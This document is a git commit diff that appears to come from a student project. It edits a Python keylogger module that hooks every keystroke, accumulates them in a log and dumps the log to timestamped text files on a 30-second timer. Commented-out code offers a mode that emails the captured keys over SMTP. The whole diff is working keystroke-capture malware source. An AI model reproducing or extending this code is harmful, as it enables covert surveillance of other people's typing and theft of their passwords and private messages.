8c6cb294a0c8240163a8aa03c030bb16f4df33ee
Bert Van Itterbeeck <bert.vanitterbeeck@student.ap.be>
2022-12-31 00:57:32 +0100

    comined work

--- modules/keylogger.py
+++ modules/keylogger.py
@@ -4,16 +4,18 @@ import smtplib # for sending email using SMTP protocol (gmail)
 from threading import Timer
 from datetime import datetime
 
+SEND_REPORT_EVERY = 30 # in seconds, 60 means 1 minute and so on
+
 def run(**args):
-    keylogger = Keylogger(interval= 60, report_method="file")
+    # if you want a keylogger to send to your email
+    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+    # if you want a keylogger to record keylogs to a local file 
+    # (and then send it using your favorite method)
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     keylogger.start()
-    if keyboard.is_pressed("space"):
-        print("pressed")
-        return keylogger.report()
-    
 
 class Keylogger:
-    def __init__(self, interval, report_method="email"):
+    def __init__(self, interval, report_method="file"):
         # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
         self.report_method = report_method
@@ -23,7 +25,7 @@ class Keylogger:
         # record start & end datetimes
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
-
+    
     def callback(self, event):
         """
         This callback is invoked whenever a keyboard event is occured
@@ -47,23 +49,32 @@ class Keylogger:
                 name = f"[{name.upper()}]"
         # finally, add the key name to our global `self.log` variable
         self.log += name
-
+    
     def update_filename(self):
         # construct the filename to be identified by start & end datetimes
         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
         end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
         self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
 
+    def report_to_file(self):
+        """This method creates a log file in the current directory that contains
+        the current keylogs in the `self.log` variable"""
+        # open the file in write mode (create it)
+        with open(f"{self.filename}.txt", "w") as f:
+            # write the keylogs to the file
+            print(self.log, file=f)
+        print(f"[+] Saved {self.filename}.txt")
+    
     def report(self):
+        """
+        This function gets called every `self.interval`
+        It basically sends keylogs and resets `self.log` variable
+        """
         if self.log:
             # if there is something in log, report it
             self.end_dt = datetime.now()
             # update `self.filename`
-            self.update_filename()
-            with open(f"{self.filename}.txt", "w") as f:
-            # write the keylogs to the file
-                print(self.log, file=f)
-            print(f"[+] Saved {self.filename}.txt")
+            self.report_to_file()
             # if you don't want to print in the console, comment below line
             print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
@@ -73,7 +84,6 @@ class Keylogger:
         timer.daemon = True
         # start the timer
         timer.start()
-        return self.log
 
     def start(self):
         # record the start datetime
@@ -86,3 +96,5 @@ class Keylogger:
         print(f"{datetime.now()} - Started keylogger")
         # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
+
+    
